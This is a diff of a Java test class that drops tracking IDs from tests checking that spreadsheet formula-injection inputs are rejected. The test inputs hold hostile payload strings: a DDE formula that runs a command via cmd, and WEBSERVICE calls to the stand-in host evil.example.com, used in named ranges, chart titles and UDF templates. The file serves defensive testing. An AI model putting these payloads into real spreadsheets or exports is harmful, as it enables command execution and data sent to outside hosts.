@@ -239,7 +239,7 @@ class ProtocolResidualCoverageTest {
   }
 
   @Test
-  void rejectsWebserviceFormulaInjectionInAllCaseForms() { // LIM-031
+  void rejectsWebserviceFormulaInjectionInAllCaseForms() {
     assertThrows(
         IllegalArgumentException.class,
         () ->
@@ -266,8 +266,8 @@ class ProtocolResidualCoverageTest {
   }
 
   @Test
-  void rejectsFormulaInjectionInNamedRangeChartTitleAndUdfTemplate() { // LIM-032, LIM-033, LIM-034
-    // LIM-032 — named-range formula target
+  void rejectsFormulaInjectionInNamedRangeChartTitleAndUdfTemplate() {
+    // Named-range formula target
     assertThrows(
         IllegalArgumentException.class,
         () -> NamedRangeTarget.formula("DDE(\"cmd\",\"/C calc\",\"\")"));
@@ -281,7 +281,7 @@ class ProtocolResidualCoverageTest {
         IllegalArgumentException.class,
         () -> NamedRangeTarget.formula("webservice(\"https://evil.example.com\")"));
 
-    // LIM-033 — chart title formula
+    // Chart title formula
     assertThrows(
         IllegalArgumentException.class,
         () -> new ChartTitleSpec.Formula("DDE(\"cmd\",\"/C calc\",\"\")"));
@@ -289,7 +289,7 @@ class ProtocolResidualCoverageTest {
         IllegalArgumentException.class,
         () -> new ChartTitleSpec.Formula("WEBSERVICE(\"https://evil.example.com\")"));
 
-    // LIM-034 — UDF formula template (defense-in-depth; POI evaluator won't execute these
+    // UDF formula template (defense-in-depth; POI evaluator won't execute these
     //           server-side, but they must not silently end up in future execution paths)
     assertThrows(
         IllegalArgumentException.class,
